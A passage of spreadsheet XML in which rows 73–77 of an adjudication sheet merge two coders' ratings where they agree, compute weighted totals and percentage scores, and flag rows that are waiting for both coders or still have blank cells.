        <f>IF(AI73="","",N(E73)*3+N(F73)*2+N(G73)*2+N(H73)*2+N(I73)*2+N(J73)*3+N(K73)*3+N(L73)*3)</f>
        <v/>
      </c>
      <c r="AK73" s="11">
        <f>IF(AI73="","",COUNTIF(N73:AG73,1))</f>
        <v/>
      </c>
      <c r="AL73" s="11">
        <f>IF(OR(AJ73="",AJ73=0),"",ROUND(100*(AJ73-AK73)/AJ73,1))</f>
        <v/>
      </c>
      <c r="AM73" s="11">
        <f>IF(AND(Coder1!AN73=1,Coder2!AN73=1),IF(COUNTBLANK(E73:AH73)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN73" s="11">
        <f>IF(AND(Coder1!AN73=1,Coder2!AN73=1),IF(SUMPRODUCT(--(Coder1!E73:AH73&amp;""&lt;&gt;Coder2!E73:AH73&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO73" s="11" t="n"/>
    </row>
    <row r="74">
      <c r="A74" s="11">
        <f>Coder1!A74</f>
        <v/>
      </c>
      <c r="B74" s="11">
        <f>Coder1!B74</f>
        <v/>
      </c>
      <c r="C74" s="11">
        <f>Coder1!C74</f>
        <v/>
      </c>
      <c r="D74" s="11">
        <f>Coder1!D74</f>
        <v/>
      </c>
      <c r="E74" s="14">
        <f>IF(AND(Coder1!E74&amp;""&lt;&gt;"",Coder1!E74&amp;""=Coder2!E74&amp;""),Coder1!E74,"")</f>
        <v/>
      </c>
      <c r="F74" s="14">
        <f>IF(AND(Coder1!F74&amp;""&lt;&gt;"",Coder1!F74&amp;""=Coder2!F74&amp;""),Coder1!F74,"")</f>
        <v/>
      </c>
      <c r="G74" s="14">
        <f>IF(AND(Coder1!G74&amp;""&lt;&gt;"",Coder1!G74&amp;""=Coder2!G74&amp;""),Coder1!G74,"")</f>
        <v/>
      </c>
      <c r="H74" s="14">
        <f>IF(AND(Coder1!H74&amp;""&lt;&gt;"",Coder1!H74&amp;""=Coder2!H74&amp;""),Coder1!H74,"")</f>
        <v/>
      </c>
      <c r="I74" s="14">
        <f>IF(AND(Coder1!I74&amp;""&lt;&gt;"",Coder1!I74&amp;""=Coder2!I74&amp;""),Coder1!I74,"")</f>
        <v/>
      </c>
      <c r="J74" s="14">
        <f>IF(AND(Coder1!J74&amp;""&lt;&gt;"",Coder1!J74&amp;""=Coder2!J74&amp;""),Coder1!J74,"")</f>
        <v/>
      </c>
      <c r="K74" s="14">
        <f>IF(AND(Coder1!K74&amp;""&lt;&gt;"",Coder1!K74&amp;""=Coder2!K74&amp;""),Coder1!K74,"")</f>
        <v/>
      </c>
      <c r="L74" s="14">
        <f>IF(AND(Coder1!L74&amp;""&lt;&gt;"",Coder1!L74&amp;""=Coder2!L74&amp;""),Coder1!L74,"")</f>
        <v/>
      </c>
      <c r="M74" s="14">
        <f>IF(AND(Coder1!M74&amp;""&lt;&gt;"",Coder1!M74&amp;""=Coder2!M74&amp;""),Coder1!M74,"")</f>
        <v/>
      </c>
      <c r="N74" s="14">
        <f>IF(AND(Coder1!N74&amp;""&lt;&gt;"",Coder1!N74&amp;""=Coder2!N74&amp;""),Coder1!N74,"")</f>
        <v/>
      </c>
      <c r="O74" s="14">
        <f>IF(AND(Coder1!O74&amp;""&lt;&gt;"",Coder1!O74&amp;""=Coder2!O74&amp;""),Coder1!O74,"")</f>
        <v/>
      </c>
      <c r="P74" s="14">
        <f>IF(AND(Coder1!P74&amp;""&lt;&gt;"",Coder1!P74&amp;""=Coder2!P74&amp;""),Coder1!P74,"")</f>
        <v/>
      </c>
      <c r="Q74" s="14">
        <f>IF(AND(Coder1!Q74&amp;""&lt;&gt;"",Coder1!Q74&amp;""=Coder2!Q74&amp;""),Coder1!Q74,"")</f>
        <v/>
      </c>
      <c r="R74" s="14">
        <f>IF(AND(Coder1!R74&amp;""&lt;&gt;"",Coder1!R74&amp;""=Coder2!R74&amp;""),Coder1!R74,"")</f>
        <v/>
      </c>
      <c r="S74" s="14">
        <f>IF(AND(Coder1!S74&amp;""&lt;&gt;"",Coder1!S74&amp;""=Coder2!S74&amp;""),Coder1!S74,"")</f>
        <v/>
      </c>
      <c r="T74" s="14">
        <f>IF(AND(Coder1!T74&amp;""&lt;&gt;"",Coder1!T74&amp;""=Coder2!T74&amp;""),Coder1!T74,"")</f>
        <v/>
      </c>
      <c r="U74" s="14">
        <f>IF(AND(Coder1!U74&amp;""&lt;&gt;"",Coder1!U74&amp;""=Coder2!U74&amp;""),Coder1!U74,"")</f>
        <v/>
      </c>
      <c r="V74" s="14">
        <f>IF(AND(Coder1!V74&amp;""&lt;&gt;"",Coder1!V74&amp;""=Coder2!V74&amp;""),Coder1!V74,"")</f>
        <v/>
      </c>
      <c r="W74" s="14">
        <f>IF(AND(Coder1!W74&amp;""&lt;&gt;"",Coder1!W74&amp;""=Coder2!W74&amp;""),Coder1!W74,"")</f>
        <v/>
      </c>
      <c r="X74" s="14">
        <f>IF(AND(Coder1!X74&amp;""&lt;&gt;"",Coder1!X74&amp;""=Coder2!X74&amp;""),Coder1!X74,"")</f>
        <v/>
      </c>
      <c r="Y74" s="14">
        <f>IF(AND(Coder1!Y74&amp;""&lt;&gt;"",Coder1!Y74&amp;""=Coder2!Y74&amp;""),Coder1!Y74,"")</f>
        <v/>
      </c>
      <c r="Z74" s="14">
        <f>IF(AND(Coder1!Z74&amp;""&lt;&gt;"",Coder1!Z74&amp;""=Coder2!Z74&amp;""),Coder1!Z74,"")</f>
        <v/>
      </c>
      <c r="AA74" s="14">
        <f>IF(AND(Coder1!AA74&amp;""&lt;&gt;"",Coder1!AA74&amp;""=Coder2!AA74&amp;""),Coder1!AA74,"")</f>
        <v/>
      </c>
      <c r="AB74" s="14">
        <f>IF(AND(Coder1!AB74&amp;""&lt;&gt;"",Coder1!AB74&amp;""=Coder2!AB74&amp;""),Coder1!AB74,"")</f>
        <v/>
      </c>
      <c r="AC74" s="14">
        <f>IF(AND(Coder1!AC74&amp;""&lt;&gt;"",Coder1!AC74&amp;""=Coder2!AC74&amp;""),Coder1!AC74,"")</f>
        <v/>
      </c>
      <c r="AD74" s="14">
        <f>IF(AND(Coder1!AD74&amp;""&lt;&gt;"",Coder1!AD74&amp;""=Coder2!AD74&amp;""),Coder1!AD74,"")</f>
        <v/>
      </c>
      <c r="AE74" s="14">
        <f>IF(AND(Coder1!AE74&amp;""&lt;&gt;"",Coder1!AE74&amp;""=Coder2!AE74&amp;""),Coder1!AE74,"")</f>
        <v/>
      </c>
      <c r="AF74" s="14">
        <f>IF(AND(Coder1!AF74&amp;""&lt;&gt;"",Coder1!AF74&amp;""=Coder2!AF74&amp;""),Coder1!AF74,"")</f>
        <v/>
      </c>
      <c r="AG74" s="14">
        <f>IF(AND(Coder1!AG74&amp;""&lt;&gt;"",Coder1!AG74&amp;""=Coder2!AG74&amp;""),Coder1!AG74,"")</f>
        <v/>
      </c>
      <c r="AH74" s="14">
        <f>IF(AND(Coder1!AH74&amp;""&lt;&gt;"",Coder1!AH74&amp;""=Coder2!AH74&amp;""),Coder1!AH74,"")</f>
        <v/>
      </c>
      <c r="AI74" s="11">
        <f>IF(COUNT(E74:L74)=0,"",SUM(E74:L74))</f>
        <v/>
      </c>
      <c r="AJ74" s="11">
        <f>IF(AI74="","",N(E74)*3+N(F74)*2+N(G74)*2+N(H74)*2+N(I74)*2+N(J74)*3+N(K74)*3+N(L74)*3)</f>
        <v/>
      </c>
      <c r="AK74" s="11">
        <f>IF(AI74="","",COUNTIF(N74:AG74,1))</f>
        <v/>
      </c>
      <c r="AL74" s="11">
        <f>IF(OR(AJ74="",AJ74=0),"",ROUND(100*(AJ74-AK74)/AJ74,1))</f>
        <v/>
      </c>
      <c r="AM74" s="11">
        <f>IF(AND(Coder1!AN74=1,Coder2!AN74=1),IF(COUNTBLANK(E74:AH74)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN74" s="11">
        <f>IF(AND(Coder1!AN74=1,Coder2!AN74=1),IF(SUMPRODUCT(--(Coder1!E74:AH74&amp;""&lt;&gt;Coder2!E74:AH74&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO74" s="11" t="n"/>
    </row>
    <row r="75">
      <c r="A75" s="11">
        <f>Coder1!A75</f>
        <v/>
      </c>
      <c r="B75" s="11">
        <f>Coder1!B75</f>
        <v/>
      </c>
      <c r="C75" s="11">
        <f>Coder1!C75</f>
        <v/>
      </c>
      <c r="D75" s="11">
        <f>Coder1!D75</f>
        <v/>
      </c>
      <c r="E75" s="14">
        <f>IF(AND(Coder1!E75&amp;""&lt;&gt;"",Coder1!E75&amp;""=Coder2!E75&amp;""),Coder1!E75,"")</f>
        <v/>
      </c>
      <c r="F75" s="14">
        <f>IF(AND(Coder1!F75&amp;""&lt;&gt;"",Coder1!F75&amp;""=Coder2!F75&amp;""),Coder1!F75,"")</f>
        <v/>
      </c>
      <c r="G75" s="14">
        <f>IF(AND(Coder1!G75&amp;""&lt;&gt;"",Coder1!G75&amp;""=Coder2!G75&amp;""),Coder1!G75,"")</f>
        <v/>
      </c>
      <c r="H75" s="14">
        <f>IF(AND(Coder1!H75&amp;""&lt;&gt;"",Coder1!H75&amp;""=Coder2!H75&amp;""),Coder1!H75,"")</f>
        <v/>
      </c>
      <c r="I75" s="14">
        <f>IF(AND(Coder1!I75&amp;""&lt;&gt;"",Coder1!I75&amp;""=Coder2!I75&amp;""),Coder1!I75,"")</f>
        <v/>
      </c>
      <c r="J75" s="14">
        <f>IF(AND(Coder1!J75&amp;""&lt;&gt;"",Coder1!J75&amp;""=Coder2!J75&amp;""),Coder1!J75,"")</f>
        <v/>
      </c>
      <c r="K75" s="14">
        <f>IF(AND(Coder1!K75&amp;""&lt;&gt;"",Coder1!K75&amp;""=Coder2!K75&amp;""),Coder1!K75,"")</f>
        <v/>
      </c>
      <c r="L75" s="14">
        <f>IF(AND(Coder1!L75&amp;""&lt;&gt;"",Coder1!L75&amp;""=Coder2!L75&amp;""),Coder1!L75,"")</f>
        <v/>
      </c>
      <c r="M75" s="14">
        <f>IF(AND(Coder1!M75&amp;""&lt;&gt;"",Coder1!M75&amp;""=Coder2!M75&amp;""),Coder1!M75,"")</f>
        <v/>
      </c>
      <c r="N75" s="14">
        <f>IF(AND(Coder1!N75&amp;""&lt;&gt;"",Coder1!N75&amp;""=Coder2!N75&amp;""),Coder1!N75,"")</f>
        <v/>
      </c>
      <c r="O75" s="14">
        <f>IF(AND(Coder1!O75&amp;""&lt;&gt;"",Coder1!O75&amp;""=Coder2!O75&amp;""),Coder1!O75,"")</f>
        <v/>
      </c>
      <c r="P75" s="14">
        <f>IF(AND(Coder1!P75&amp;""&lt;&gt;"",Coder1!P75&amp;""=Coder2!P75&amp;""),Coder1!P75,"")</f>
        <v/>
      </c>
      <c r="Q75" s="14">
        <f>IF(AND(Coder1!Q75&amp;""&lt;&gt;"",Coder1!Q75&amp;""=Coder2!Q75&amp;""),Coder1!Q75,"")</f>
        <v/>
      </c>
      <c r="R75" s="14">
        <f>IF(AND(Coder1!R75&amp;""&lt;&gt;"",Coder1!R75&amp;""=Coder2!R75&amp;""),Coder1!R75,"")</f>
        <v/>
      </c>
      <c r="S75" s="14">
        <f>IF(AND(Coder1!S75&amp;""&lt;&gt;"",Coder1!S75&amp;""=Coder2!S75&amp;""),Coder1!S75,"")</f>
        <v/>
      </c>
      <c r="T75" s="14">
        <f>IF(AND(Coder1!T75&amp;""&lt;&gt;"",Coder1!T75&amp;""=Coder2!T75&amp;""),Coder1!T75,"")</f>
        <v/>
      </c>
      <c r="U75" s="14">
        <f>IF(AND(Coder1!U75&amp;""&lt;&gt;"",Coder1!U75&amp;""=Coder2!U75&amp;""),Coder1!U75,"")</f>
        <v/>
      </c>
      <c r="V75" s="14">
        <f>IF(AND(Coder1!V75&amp;""&lt;&gt;"",Coder1!V75&amp;""=Coder2!V75&amp;""),Coder1!V75,"")</f>
        <v/>
      </c>
      <c r="W75" s="14">
        <f>IF(AND(Coder1!W75&amp;""&lt;&gt;"",Coder1!W75&amp;""=Coder2!W75&amp;""),Coder1!W75,"")</f>
        <v/>
      </c>
      <c r="X75" s="14">
        <f>IF(AND(Coder1!X75&amp;""&lt;&gt;"",Coder1!X75&amp;""=Coder2!X75&amp;""),Coder1!X75,"")</f>
        <v/>
      </c>
      <c r="Y75" s="14">
        <f>IF(AND(Coder1!Y75&amp;""&lt;&gt;"",Coder1!Y75&amp;""=Coder2!Y75&amp;""),Coder1!Y75,"")</f>
        <v/>
      </c>
      <c r="Z75" s="14">
        <f>IF(AND(Coder1!Z75&amp;""&lt;&gt;"",Coder1!Z75&amp;""=Coder2!Z75&amp;""),Coder1!Z75,"")</f>
        <v/>
      </c>
      <c r="AA75" s="14">
        <f>IF(AND(Coder1!AA75&amp;""&lt;&gt;"",Coder1!AA75&amp;""=Coder2!AA75&amp;""),Coder1!AA75,"")</f>
        <v/>
      </c>
      <c r="AB75" s="14">
        <f>IF(AND(Coder1!AB75&amp;""&lt;&gt;"",Coder1!AB75&amp;""=Coder2!AB75&amp;""),Coder1!AB75,"")</f>
        <v/>
      </c>
      <c r="AC75" s="14">
        <f>IF(AND(Coder1!AC75&amp;""&lt;&gt;"",Coder1!AC75&amp;""=Coder2!AC75&amp;""),Coder1!AC75,"")</f>
        <v/>
      </c>
      <c r="AD75" s="14">
        <f>IF(AND(Coder1!AD75&amp;""&lt;&gt;"",Coder1!AD75&amp;""=Coder2!AD75&amp;""),Coder1!AD75,"")</f>
        <v/>
      </c>
      <c r="AE75" s="14">
        <f>IF(AND(Coder1!AE75&amp;""&lt;&gt;"",Coder1!AE75&amp;""=Coder2!AE75&amp;""),Coder1!AE75,"")</f>
        <v/>
      </c>
      <c r="AF75" s="14">
        <f>IF(AND(Coder1!AF75&amp;""&lt;&gt;"",Coder1!AF75&amp;""=Coder2!AF75&amp;""),Coder1!AF75,"")</f>
        <v/>
      </c>
      <c r="AG75" s="14">
        <f>IF(AND(Coder1!AG75&amp;""&lt;&gt;"",Coder1!AG75&amp;""=Coder2!AG75&amp;""),Coder1!AG75,"")</f>
        <v/>
      </c>
      <c r="AH75" s="14">
        <f>IF(AND(Coder1!AH75&amp;""&lt;&gt;"",Coder1!AH75&amp;""=Coder2!AH75&amp;""),Coder1!AH75,"")</f>
        <v/>
      </c>
      <c r="AI75" s="11">
        <f>IF(COUNT(E75:L75)=0,"",SUM(E75:L75))</f>
        <v/>
      </c>
      <c r="AJ75" s="11">
        <f>IF(AI75="","",N(E75)*3+N(F75)*2+N(G75)*2+N(H75)*2+N(I75)*2+N(J75)*3+N(K75)*3+N(L75)*3)</f>
        <v/>
      </c>
      <c r="AK75" s="11">
        <f>IF(AI75="","",COUNTIF(N75:AG75,1))</f>
        <v/>
      </c>
      <c r="AL75" s="11">
        <f>IF(OR(AJ75="",AJ75=0),"",ROUND(100*(AJ75-AK75)/AJ75,1))</f>
        <v/>
      </c>
      <c r="AM75" s="11">
        <f>IF(AND(Coder1!AN75=1,Coder2!AN75=1),IF(COUNTBLANK(E75:AH75)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN75" s="11">
        <f>IF(AND(Coder1!AN75=1,Coder2!AN75=1),IF(SUMPRODUCT(--(Coder1!E75:AH75&amp;""&lt;&gt;Coder2!E75:AH75&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO75" s="11" t="n"/>
    </row>
    <row r="76">
      <c r="A76" s="11">
        <f>Coder1!A76</f>
        <v/>
      </c>
      <c r="B76" s="11">
        <f>Coder1!B76</f>
        <v/>
      </c>
      <c r="C76" s="11">
        <f>Coder1!C76</f>
        <v/>
      </c>
      <c r="D76" s="11">
        <f>Coder1!D76</f>
        <v/>
      </c>
      <c r="E76" s="14">
        <f>IF(AND(Coder1!E76&amp;""&lt;&gt;"",Coder1!E76&amp;""=Coder2!E76&amp;""),Coder1!E76,"")</f>
        <v/>
      </c>
      <c r="F76" s="14">
        <f>IF(AND(Coder1!F76&amp;""&lt;&gt;"",Coder1!F76&amp;""=Coder2!F76&amp;""),Coder1!F76,"")</f>
        <v/>
      </c>
      <c r="G76" s="14">
        <f>IF(AND(Coder1!G76&amp;""&lt;&gt;"",Coder1!G76&amp;""=Coder2!G76&amp;""),Coder1!G76,"")</f>
        <v/>
      </c>
      <c r="H76" s="14">
        <f>IF(AND(Coder1!H76&amp;""&lt;&gt;"",Coder1!H76&amp;""=Coder2!H76&amp;""),Coder1!H76,"")</f>
        <v/>
      </c>
      <c r="I76" s="14">
        <f>IF(AND(Coder1!I76&amp;""&lt;&gt;"",Coder1!I76&amp;""=Coder2!I76&amp;""),Coder1!I76,"")</f>
        <v/>
      </c>
      <c r="J76" s="14">
        <f>IF(AND(Coder1!J76&amp;""&lt;&gt;"",Coder1!J76&amp;""=Coder2!J76&amp;""),Coder1!J76,"")</f>
        <v/>
      </c>
      <c r="K76" s="14">
        <f>IF(AND(Coder1!K76&amp;""&lt;&gt;"",Coder1!K76&amp;""=Coder2!K76&amp;""),Coder1!K76,"")</f>
        <v/>
      </c>
      <c r="L76" s="14">
        <f>IF(AND(Coder1!L76&amp;""&lt;&gt;"",Coder1!L76&amp;""=Coder2!L76&amp;""),Coder1!L76,"")</f>
        <v/>
      </c>
      <c r="M76" s="14">
        <f>IF(AND(Coder1!M76&amp;""&lt;&gt;"",Coder1!M76&amp;""=Coder2!M76&amp;""),Coder1!M76,"")</f>
        <v/>
      </c>
      <c r="N76" s="14">
        <f>IF(AND(Coder1!N76&amp;""&lt;&gt;"",Coder1!N76&amp;""=Coder2!N76&amp;""),Coder1!N76,"")</f>
        <v/>
      </c>
      <c r="O76" s="14">
        <f>IF(AND(Coder1!O76&amp;""&lt;&gt;"",Coder1!O76&amp;""=Coder2!O76&amp;""),Coder1!O76,"")</f>
        <v/>
      </c>
      <c r="P76" s="14">
        <f>IF(AND(Coder1!P76&amp;""&lt;&gt;"",Coder1!P76&amp;""=Coder2!P76&amp;""),Coder1!P76,"")</f>
        <v/>
      </c>
      <c r="Q76" s="14">
        <f>IF(AND(Coder1!Q76&amp;""&lt;&gt;"",Coder1!Q76&amp;""=Coder2!Q76&amp;""),Coder1!Q76,"")</f>
        <v/>
      </c>
      <c r="R76" s="14">
        <f>IF(AND(Coder1!R76&amp;""&lt;&gt;"",Coder1!R76&amp;""=Coder2!R76&amp;""),Coder1!R76,"")</f>
        <v/>
      </c>
      <c r="S76" s="14">
        <f>IF(AND(Coder1!S76&amp;""&lt;&gt;"",Coder1!S76&amp;""=Coder2!S76&amp;""),Coder1!S76,"")</f>
        <v/>
      </c>
      <c r="T76" s="14">
        <f>IF(AND(Coder1!T76&amp;""&lt;&gt;"",Coder1!T76&amp;""=Coder2!T76&amp;""),Coder1!T76,"")</f>
        <v/>
      </c>
      <c r="U76" s="14">
        <f>IF(AND(Coder1!U76&amp;""&lt;&gt;"",Coder1!U76&amp;""=Coder2!U76&amp;""),Coder1!U76,"")</f>
        <v/>
      </c>
      <c r="V76" s="14">
        <f>IF(AND(Coder1!V76&amp;""&lt;&gt;"",Coder1!V76&amp;""=Coder2!V76&amp;""),Coder1!V76,"")</f>
        <v/>
      </c>
      <c r="W76" s="14">
        <f>IF(AND(Coder1!W76&amp;""&lt;&gt;"",Coder1!W76&amp;""=Coder2!W76&amp;""),Coder1!W76,"")</f>
        <v/>
      </c>
      <c r="X76" s="14">
        <f>IF(AND(Coder1!X76&amp;""&lt;&gt;"",Coder1!X76&amp;""=Coder2!X76&amp;""),Coder1!X76,"")</f>
        <v/>
      </c>
      <c r="Y76" s="14">
        <f>IF(AND(Coder1!Y76&amp;""&lt;&gt;"",Coder1!Y76&amp;""=Coder2!Y76&amp;""),Coder1!Y76,"")</f>
        <v/>
      </c>
      <c r="Z76" s="14">
        <f>IF(AND(Coder1!Z76&amp;""&lt;&gt;"",Coder1!Z76&amp;""=Coder2!Z76&amp;""),Coder1!Z76,"")</f>
        <v/>
      </c>
      <c r="AA76" s="14">
        <f>IF(AND(Coder1!AA76&amp;""&lt;&gt;"",Coder1!AA76&amp;""=Coder2!AA76&amp;""),Coder1!AA76,"")</f>
        <v/>
      </c>
      <c r="AB76" s="14">
        <f>IF(AND(Coder1!AB76&amp;""&lt;&gt;"",Coder1!AB76&amp;""=Coder2!AB76&amp;""),Coder1!AB76,"")</f>
        <v/>
      </c>
      <c r="AC76" s="14">
        <f>IF(AND(Coder1!AC76&amp;""&lt;&gt;"",Coder1!AC76&amp;""=Coder2!AC76&amp;""),Coder1!AC76,"")</f>
        <v/>
      </c>
      <c r="AD76" s="14">
        <f>IF(AND(Coder1!AD76&amp;""&lt;&gt;"",Coder1!AD76&amp;""=Coder2!AD76&amp;""),Coder1!AD76,"")</f>
        <v/>
      </c>
      <c r="AE76" s="14">
        <f>IF(AND(Coder1!AE76&amp;""&lt;&gt;"",Coder1!AE76&amp;""=Coder2!AE76&amp;""),Coder1!AE76,"")</f>
        <v/>
      </c>
      <c r="AF76" s="14">
        <f>IF(AND(Coder1!AF76&amp;""&lt;&gt;"",Coder1!AF76&amp;""=Coder2!AF76&amp;""),Coder1!AF76,"")</f>
        <v/>
      </c>
      <c r="AG76" s="14">
        <f>IF(AND(Coder1!AG76&amp;""&lt;&gt;"",Coder1!AG76&amp;""=Coder2!AG76&amp;""),Coder1!AG76,"")</f>
        <v/>
      </c>
      <c r="AH76" s="14">
        <f>IF(AND(Coder1!AH76&amp;""&lt;&gt;"",Coder1!AH76&amp;""=Coder2!AH76&amp;""),Coder1!AH76,"")</f>
        <v/>
      </c>
      <c r="AI76" s="11">
        <f>IF(COUNT(E76:L76)=0,"",SUM(E76:L76))</f>
        <v/>
      </c>
      <c r="AJ76" s="11">
        <f>IF(AI76="","",N(E76)*3+N(F76)*2+N(G76)*2+N(H76)*2+N(I76)*2+N(J76)*3+N(K76)*3+N(L76)*3)</f>
        <v/>
      </c>
      <c r="AK76" s="11">
        <f>IF(AI76="","",COUNTIF(N76:AG76,1))</f>
        <v/>
      </c>
      <c r="AL76" s="11">
        <f>IF(OR(AJ76="",AJ76=0),"",ROUND(100*(AJ76-AK76)/AJ76,1))</f>
        <v/>
      </c>
      <c r="AM76" s="11">
        <f>IF(AND(Coder1!AN76=1,Coder2!AN76=1),IF(COUNTBLANK(E76:AH76)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN76" s="11">
        <f>IF(AND(Coder1!AN76=1,Coder2!AN76=1),IF(SUMPRODUCT(--(Coder1!E76:AH76&amp;""&lt;&gt;Coder2!E76:AH76&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO76" s="11" t="n"/>
    </row>
    <row r="77">
      <c r="A77" s="11">
        <f>Coder1!A77</f>
        <v/>
      </c>
      <c r="B77" s="11">
        <f>Coder1!B77</f>
        <v/>
      </c>
      <c r="C77" s="11">
        <f>Coder1!C77</f>
        <v/>
      </c>
      <c r="D77" s="11">
        <f>Coder1!D77</f>
        <v/>
      </c>
      <c r="E77" s="14">
        <f>IF(AND(Coder1!E77&amp;""&lt;&gt;"",Coder1!E77&amp;""=Coder2!E77&amp;""),Coder1!E77,"")</f>
        <v/>
      </c>
      <c r="F77" s="14">
        <f>IF(AND(Coder1!F77&amp;""&lt;&gt;"",Coder1!F77&amp;""=Coder2!F77&amp;""),Coder1!F77,"")</f>
        <v/>
      </c>
      <c r="G77" s="14">
        <f>IF(AND(Coder1!G77&amp;""&lt;&gt;"",Coder1!G77&amp;""=Coder2!G77&amp;""),Coder1!G77,"")</f>
        <v/>
      </c>
      <c r="H77" s="14">
        <f>IF(AND(Coder1!H77&amp;""&lt;&gt;"",Coder1!H77&amp;""=Coder2!H77&amp;""),Coder1!H77,"")</f>
        <v/>
      </c>
      <c r="I77" s="14">
        <f>IF(AND(Coder1!I77&amp;""&lt;&gt;"",Coder1!I77&amp;""=Coder2!I77&amp;""),Coder1!I77,"")</f>
        <v/>
      </c>
      <c r="J77" s="14">
        <f>IF(AND(Coder1!J77&amp;""&lt;&gt;"",Coder1!J77&amp;""=Coder2!J77&amp;""),Coder1!J77,"")</f>
        <v/>
      </c>
      <c r="K77" s="14">
        <f>IF(AND(Coder1!K77&amp;""&lt;&gt;"",Coder1!K77&amp;""=Coder2!K77&amp;""),Coder1!K77,"")</f>
        <v/>
      </c>
      <c r="L77" s="14">
        <f>IF(AND(Coder1!L77&amp;""&lt;&gt;"",Coder1!L77&amp;""=Coder2!L77&amp;""),Coder1!L77,"")</f>
        <v/>
      </c>
      <c r="M77" s="14">
        <f>IF(AND(Coder1!M77&amp;""&lt;&gt;"",Coder1!M77&amp;""=Coder2!M77&amp;""),Coder1!M77,"")</f>
        <v/>
      </c>
      <c r="N77" s="14">
        <f>IF(AND(Coder1!N77&amp;""&lt;&gt;"",Coder1!N77&amp;""=Coder2!N77&amp;""),Coder1!N77,"")</f>
        <v/>
      </c>
      <c r="O77" s="14">
        <f>IF(AND(Coder1!O77&amp;""&lt;&gt;"",Coder1!O77&amp;""=Coder2!O77&amp;""),Coder1!O77,"")</f>
        <v/>
      </c>
      <c r="P77" s="14">
        <f>IF(AND(Coder1!P77&amp;""&lt;&gt;"",Coder1!P77&amp;""=Coder2!P77&amp;""),Coder1!P77,"")</f>
        <v/>
      </c>
      <c r="Q77" s="14">
        <f>IF(AND(Coder1!Q77&amp;""&lt;&gt;"",Coder1!Q77&amp;""=Coder2!Q77&amp;""),Coder1!Q77,"")</f>
        <v/>
      </c>
      <c r="R77" s="14">
        <f>IF(AND(Coder1!R77&amp;""&lt;&gt;"",Coder1!R77&amp;""=Coder2!R77&amp;""),Coder1!R77,"")</f>
        <v/>
      </c>
      <c r="S77" s="14">
        <f>IF(AND(Coder1!S77&amp;""&lt;&gt;"",Coder1!S77&amp;""=Coder2!S77&amp;""),Coder1!S77,"")</f>
        <v/>
      </c>
      <c r="T77" s="14">
        <f>IF(AND(Coder1!T77&amp;""&lt;&gt;"",Coder1!T77&amp;""=Coder2!T77&amp;""),Coder1!T77,"")</f>
        <v/>
      </c>
      <c r="U77" s="14">
        <f>IF(AND(Coder1!U77&amp;""&lt;&gt;"",Coder1!U77&amp;""=Coder2!U77&amp;""),Coder1!U77,"")</f>
        <v/>
      </c>
      <c r="V77" s="14">
        <f>IF(AND(Coder1!V77&amp;""&lt;&gt;"",Coder1!V77&amp;""=Coder2!V77&amp;""),Coder1!V77,"")</f>
        <v/>
      </c>
      <c r="W77" s="14">
        <f>IF(AND(Coder1!W77&amp;""&lt;&gt;"",Coder1!W77&amp;""=Coder2!W77&amp;""),Coder1!W77,"")</f>
        <v/>
      </c>
      <c r="X77" s="14">
        <f>IF(AND(Coder1!X77&amp;""&lt;&gt;"",Coder1!X77&amp;""=Coder2!X77&amp;""),Coder1!X77,"")</f>
        <v/>
      </c>
      <c r="Y77" s="14">
        <f>IF(AND(Coder1!Y77&amp;""&lt;&gt;"",Coder1!Y77&amp;""=Coder2!Y77&amp;""),Coder1!Y77,"")</f>
        <v/>
      </c>
      <c r="Z77" s="14">
        <f>IF(AND(Coder1!Z77&amp;""&lt;&gt;"",Coder1!Z77&amp;""=Coder2!Z77&amp;""),Coder1!Z77,"")</f>
        <v/>
      </c>
      <c r="AA77" s="14">
        <f>IF(AND(Coder1!AA77&amp;""&lt;&gt;"",Coder1!AA77&amp;""=Coder2!AA77&amp;""),Coder1!AA77,"")</f>
        <v/>
      </c>
      <c r="AB77" s="14">
        <f>IF(AND(Coder1!AB77&amp;""&lt;&gt;"",Coder1!AB77&amp;""=Coder2!AB77&amp;""),Coder1!AB77,"")</f>
        <v/>
      </c>
      <c r="AC77" s="14">
        <f>IF(AND(Coder1!AC77&amp;""&lt;&gt;"",Coder1!AC77&amp;""=Coder2!AC77&amp;""),Coder1!AC77,"")</f>
        <v/>
      </c>
      <c r="AD77" s="14">
        <f>IF(AND(Coder1!AD77&amp;""&lt;&gt;"",Coder1!AD77&amp;""=Coder2!AD77&amp;""),Coder1!AD77,"")</f>
        <v/>
      </c>
      <c r="AE77" s="14">
        <f>IF(AND(Coder1!AE77&amp;""&lt;&gt;"",Coder1!AE77&amp;""=Coder2!AE77&amp;""),Coder1!AE77,"")</f>
        <v/>
      </c>
      <c r="AF77" s="14">
        <f>IF(AND(Coder1!AF77&amp;""&lt;&gt;"",Coder1!AF77&amp;""=Coder2!AF77&amp;""),Coder1!AF77,"")</f>
        <v/>
      </c>
      <c r="AG77" s="14">
        <f>IF(AND(Coder1!AG77&amp;""&lt;&gt;"",Coder1!AG77&amp;""=Coder2!AG77&amp;""),Coder1!AG77,"")</f>
        <v/>
      </c>
      <c r="AH77" s="14">
        <f>IF(AND(Coder1!AH77&amp;""&lt;&gt;"",Coder1!AH77&amp;""=Coder2!AH77&amp;""),Coder1!AH77,"")</f>
        <v/>
      </c>
      <c r="AI77" s="11">
        <f>IF(COUNT(E77:L77)=0,"",SUM(E77:L77))</f>
        <v/>
      </c>
      <c r="AJ77" s="11">
        <f>IF(AI77="","",N(E77)*3+N(F77)*2+N(G77)*2+N(H77)*2+N(I77)*2+N(J77)*3+N(K77)*3+N(L77)*3)</f>
        <v/>
      </c>
      <c r="AK77" s="11">
        <f>IF(AI77="","",COUNTIF(N77:AG77,1))</f>
        <v/>
      </c>
      <c r="AL77" s="11">
        <f>IF(OR(AJ77="",AJ77=0),"",ROUND(100*(AJ77-AK77)/AJ77,1))</f>
        <v/>
      </c>
      <c r="AM77" s="11">
        <f>IF(AND(Coder1!AN77=1,Coder2!AN77=1),IF(COUNTBLANK(E77:AH77)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
